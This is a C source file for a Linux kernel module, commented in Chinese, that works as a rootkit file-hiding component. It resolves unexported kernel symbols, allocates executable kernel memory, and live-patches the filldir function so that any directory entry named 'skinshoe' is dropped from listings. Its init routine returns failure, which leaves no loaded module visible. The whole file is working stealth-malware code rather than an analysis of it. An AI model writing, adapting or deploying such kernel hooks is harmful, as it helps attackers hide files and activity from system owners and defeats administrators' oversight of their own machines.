// hide_file.c
#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/cpu.h>

char *stub;

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char        d_name[1];
};

struct getdents_callback {
    struct linux_dirent __user * current_dir;
    struct linux_dirent __user * previous;
    int count;
    int error;
};

noinline int stub_filldir(void * __buf, const char * name, int namelen, loff_t offset,
			u64 ino, unsigned int d_type)
{
	// 使用char数组的话，需要strncmp函数调用，这就需要校准偏移了，麻烦
	//char shoe[8] = {'s', 'k', 'i', 'n', 's', 'h', 'o', 'e'};
	//if (!strncmp(name, shoe, namelen))  {

	// 直接使用"skinshoe"的话，常量字符串会随着模块的退出而释放，放弃
	//if (!strncmp(name, "skinshoe", namelen))  {

	// 直接逐字符比较
	// 最好的方法还是将“皮鞋”藏在某些不为人知的缝隙里
	if (name[0] == 's' && name[1] == 'k' && name[2] == 'i' &&
		name[3] == 'n' && name[4] == 's' && name[5] == 'h' &&
		name[6] == 'o' && name[7] == 'e') {
		struct linux_dirent __user * dirent = NULL;
		struct getdents_callback * buf = (struct getdents_callback *) __buf;
		int reclen = ALIGN(offsetof(struct linux_dirent, d_name) + namelen + 2, sizeof(long));

		dirent = (void __user *)dirent + reclen;
		buf->current_dir = dirent;
		return 0;
	}
	return 1;
}

int call_stub(void * __buf, const char * name, int namelen, loff_t offset,
						u64 ino, unsigned int d_type)
{
	int ret;
	asm ("push %rdi; push %rsi; push %rdx; push %rcx; push %r8; push %r9;");
	ret = stub_filldir(__buf, name, namelen, offset, ino, d_type);
	if (!ret)
		asm ("pop %r9; pop %r8; pop %rcx; pop %rdx; pop %rsi; pop %rdi; pop %rbp; pop %r11; xor %eax,%eax; retq");
	asm ("pop %r9; pop %r8; pop %rcx; pop %rdx; pop %rsi; pop %rdi;");
	return ret;
}

static int hide = 1;
module_param(hide, int, 0444);

#define FTRACE_SIZE   	5
#define POKE_OFFSET		0
#define POKE_LENGTH		5

#define START _AC(0xffffffffa0000000, UL)
#define END   _AC(0xffffffffff000000, UL)

void * *(*___vmalloc_node_range)(unsigned long size, unsigned long align,
            unsigned long start, unsigned long end, gfp_t gfp_mask,
            pgprot_t prot, int node, const void *caller);
static void *(*_text_poke_smp)(void *addr, const void *opcode, size_t len);
static struct mutex *_text_mutex;

char *_filldir;
char restore[5] = {0x0f, 0x1f, 0x44, 0x00, 0x00};

static int __init filter_file_init(void)
{
	unsigned char jmp_call[POKE_LENGTH];
	s32 offset;
	unsigned long delta = 0x62;
	unsigned int *pos  ;

	_filldir = (void *)kallsyms_lookup_name("filldir");
	if (!_filldir) {
		return -1;
	}

	___vmalloc_node_range = (void *)kallsyms_lookup_name("__vmalloc_node_range");
	_text_poke_smp = (void *)kallsyms_lookup_name("text_poke_smp");
	_text_mutex = (void *)kallsyms_lookup_name("text_mutex");
	if (!_text_poke_smp || !_text_mutex) {
		return -1;
	}

	if (hide == 0) {
		offset = *(unsigned int *)&_filldir[1];
		stub = (char *)(offset + (unsigned long)_filldir + FTRACE_SIZE);
		offset = call_stub - stub_filldir;
		stub = stub - offset;

		get_online_cpus();
		mutex_lock(_text_mutex);
		_text_poke_smp(&_filldir[POKE_OFFSET], &restore[0], POKE_LENGTH);
		mutex_unlock(_text_mutex);
		put_online_cpus();

		vfree(stub);
		return -1;
	}

	stub = (void *)___vmalloc_node_range(0xfff, 1, START, END,
					GFP_KERNEL | __GFP_HIGHMEM, PAGE_KERNEL_EXEC,
					-1, __builtin_return_address(0));
	if (!stub) {
		printk("nomem\n");
		return -1;
	}

	memcpy(stub, stub_filldir, 0xfff);
	pos = (unsigned int *)&stub[delta];
	printk("pos is :%x  %x   %x\n", *pos, stub[delta-1], stub);
	offset = call_stub - stub_filldir;

	offset = (s32)((long)stub - (long)_filldir - FTRACE_SIZE + offset);

	jmp_call[0] = 0xe8;
	(*(s32 *)(&jmp_call[1])) = offset;
	get_online_cpus();
	mutex_lock(_text_mutex);
	_text_poke_smp(&_filldir[POKE_OFFSET], jmp_call, POKE_LENGTH);
	mutex_unlock(_text_mutex);
	put_online_cpus();

	return -1;
}

module_init(filter_file_init);
MODULE_LICENSE("GPL");
